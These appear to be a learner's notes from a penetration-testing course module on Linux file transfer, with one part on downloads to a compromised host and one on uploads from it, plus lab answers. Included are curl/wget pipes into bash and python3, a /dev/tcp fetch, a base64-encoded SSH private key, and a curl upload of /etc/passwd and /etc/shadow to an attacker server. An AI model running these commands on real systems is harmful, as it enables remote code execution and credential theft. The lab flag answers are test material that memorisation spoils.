## Download Operations
We have access to the machine `NIX04`, and we need to download a file from our `Pwnbox` machine. Let's see how we can accomplish this using multiple file download methods.

### Base64 Encoding / Decoding
```shell
$ cat id_rsa | base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d` to decode it.
```shell
$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

----
## Web Downloads with Wget and cURL
Two of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.

To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.
#### Download a File Using wget
```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
#### Download a File Using cURL
```shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

## Fileless Attacks Using Linux
#### Fileless Download with cURL
```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
#### Fileless Download with wget
```shell
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

---
## Download with Bash (/dev/tcp)

If no tools like wget or curl are available, web server on host and then:
```shell
exec 3<>/dev/tcp/10.10.10.32/8000
```

```shell
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

```shell
cat <&3
```

---
## SSH Downloads
#### Enabling the SSH Server
```shell
sudo systemctl enable ssh
```
#### Starting the SSH Server
```shell
 sudo systemctl start ssh
```
#### Checking for SSH Listening Port
```shell
netstat -lnpt\

tcp   0   0 0.0.0.0:22     0.0.0.0:*   LISTEN      - 
```

#### Linux - Downloading Files Using SCP
```shell
scp plaintext@192.168.49.128:/root/myroot.txt .
```
-> This command download a file from our host to the target machine we are on.

---

## Upload Operations
### Web Upload
#### Pwnbox - Start Web Server
```shell
sudo python3 -m pip install --user uploadserver
```
Now we need to create a certificate. In this example, we are using a self-signed certificate.
#### Pwnbox - Create a Self-Signed Certificate
```shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

```shell
mkdir https && cd https
```

```shell
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
#### Linux - Upload Multiple Files
```shell
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
We used the option `--insecure` because we used a self-signed certificate that we trust.

---
### Alternative Web File Transfer Method

#### Linux - Creating a Web Server with Python3
```shell-session
python3 -m http.server
```
#### Linux - Creating a Web Server with Python2.7
```shell-session
 python2.7 -m SimpleHTTPServer
```
#### Linux - Creating a Web Server with PHP
```shell-session
php -S 0.0.0.0:8000
```
#### Linux - Creating a Web Server with Ruby
```shell-session
 ruby -run -ehttpd . -p8000
```

#### Download the File from the Target Machine onto the Pwnbox
```shell-session
wget 192.168.49.128:8000/filetotransfer.txt
```

---
## SCP Upload
We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.

#### File Upload using SCP
```shell
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```


---

### Questions

1. Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.
```shell
> wget 10.129.234.168/flag.txt
5d21cf3da9c0ccb94f709e2559f3ea50
```

2.  Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher <extracted file>" from the command line. Submit the generated hash as your answer.
-> python web server + wget -> 159cfe5c65054bbadb2761cfa359c8b0